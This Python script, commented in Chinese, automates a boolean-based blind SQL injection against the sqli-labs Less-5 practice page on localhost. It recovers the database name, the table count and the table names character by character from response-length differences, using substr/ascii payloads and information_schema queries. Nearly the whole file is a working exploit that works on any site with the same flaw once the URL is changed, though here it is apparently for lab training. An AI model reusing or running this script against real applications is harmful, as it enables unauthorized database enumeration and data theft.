#coding=utf-8
import requests
import sys

MAX_DBName_len=10
MAX_Table_Num=10
MAX_TableName_len=10

success_url = "http://localhost/SQLI-LAB/Less-5/?id=1"
success_response_len = len(requests.get(success_url).text)
chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

'''
利用正确会回显，错误不会回显，纪录正确的页面的长度，以此作为zpayload正确执行的标记
'''
def get_DBName_len():
    print("开始爆数据库长度")
    DBName_len = 0
    url_template = success_url + "' and (length(database())={0}) %2D%2D%20" #--+ {0}里面的0用来选择format()里的参数位置
    for i in range(1, MAX_DBName_len):
        url = url_template.format(i)
        response = requests.get(url)
        if len(response.text) == success_response_len:
            DBName_len = i
            print("DBName_len is: ", DBName_len)
            break
    if DBName_len == 0:
        if i == MAX_DBName_len - 1:
            print("DBName_len > MAX_DBName_len!")
        print("Cannot get DB_len. Program ended.")
        exit()
    return DBName_len

'''
根据已得到的数据库长度，通过不断比较每一个字符，得到数据库名字 substr下标从1开始
'''
def get_DBName(DBName_len):
    print("开始获取数据库")
    print("数据库名：",end='')
    sys.stdout.flush()
    DBName = ""
    url_template = success_url + "' and ascii(substr(database(),{0},1))={1} %2D%2D%20"   
    for i in range(1, DBName_len+1):
        tempDBName = DBName
        for char in chars:
            char_ascii = ord(char)
            url = url_template.format(i, char_ascii)
            response = requests.get(url)
            if len(response.text) == success_response_len:
                print(char,end='')
                sys.stdout.flush()
                DBName += char
                break
        if tempDBName == DBName:
            print("Letters too little! Program ended.")
            exit()
    print
    return DBName

'''
根据已得到的数据库名，通过count函数爆出表的个数
'''
def get_TableNumOfDB(DBName):
    print("开始获取表名")
    TableNumOfDB = 0
    url_template = success_url + "' and (select count(table_name) as a from information_schema.tables \
        where table_schema = database() having a={0})%2D%2D%20"
    for i in range(1, MAX_Table_Num):
        url = url_template.format(i)
        response = requests.get(url)
        if len(response.text) == success_response_len:
            TableNumOfDB = i;
            print("the number of table is:" , TableNumOfDB)
            break
    if TableNumOfDB == 0:
        if i == TableNumOfDB - 1:
            print("table number of database > MAX_TableName_len!")
    return TableNumOfDB
 
'''
根据表的个数的得到规定编号表的长度
'''
def get_TableName_len(Table_num):
    #print("Start to get TableName_len...")
    TableName_len = 0
    url_template = success_url + "' and (select length(table_name) from information_schema.tables where table_schema = database() limit {0},1)={1}%2D%2D%20"
    for i in range(0, MAX_TableName_len):
        url = url_template.format(Table_num - 1, i)
        response = requests.get(url)
        if len(response.text) == success_response_len:
            TableName_len = i
            break
    if TableName_len == 0:
        if i == MAX_TableName_len - 1:
            print("TableName_len > MAX_TableName_len!")
    return TableName_len
 
'''
根据表的编号，和表的长度，报表的字段
'''
def get_TableName(Table_num, TableName_len):
    print("开始爆表名",end='')
    sys.stdout.flush()
    TableName = ""
    url_template = success_url + "' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {0},1),{1},1))={2}%23"   
    for i in range(1, TableName_len + 1):
        tempTableName = TableName
        for char in chars:
            char_ascii = ord(char)
            url = url_template.format(Table_num - 1, i, char_ascii)
            response = requests.get(url)
            if len(response.text) == success_response_len:
                TableName += char
                break           
        if tempTableName == TableName:
            print("Letters too little! Program ended.")
            exit()
    print("Retrieve completed! TableName is: " + TableName)
    return TableName


DBName=get_DBName(get_DBName_len())
Table_Nmber=get_TableNumOfDB(DBName)
for i in range(1,Table_Nmber+1):
    TableName_len = get_TableName_len(i)
    TabName = get_TableName(i,TableName_len)
